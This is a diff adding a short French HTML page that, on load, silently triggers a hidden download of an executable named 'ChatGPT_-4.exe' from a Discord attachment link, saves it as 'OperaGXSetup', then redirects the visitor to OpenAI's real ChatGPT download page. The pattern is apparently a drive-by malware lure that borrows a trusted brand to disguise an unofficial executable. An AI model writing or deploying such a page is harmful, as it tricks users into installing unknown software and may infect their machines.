@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Téléchargement Automatique et Redirection</title>
+</head>
+<body>
+    <script>
+        // URL du fichier à télécharger
+        var fileUrl = "https://cdn.discordapp.com/attachments/1297990712738185240/1351942041302728858/ChatGPT_-4.exe?ex=67dc35a4&is=67dae424&hm=5cedd2ee72fb664ae28e19900757f0619f807aeda6868bdc097d2d990badfd5f&";
+        // URL de la page de redirection
+        var redirectUrl = "https://openai.com/chatgpt/download/";
+
+        // Crée un lien de téléchargement et déclenche le téléchargement automatiquement
+        var a = document.createElement('a');
+        a.href = fileUrl;
+        a.download = "OperaGXSetup";
+        document.body.appendChild(a);
+        a.style.display = 'none';
+        a.click();
+
+        // Redirige après un délai de 1 secondes (1000 millisecondes)
+        setTimeout(function() {
+            window.location.href = redirectUrl;
+        }, 1000);
+    </script>
+</body>
+</html>
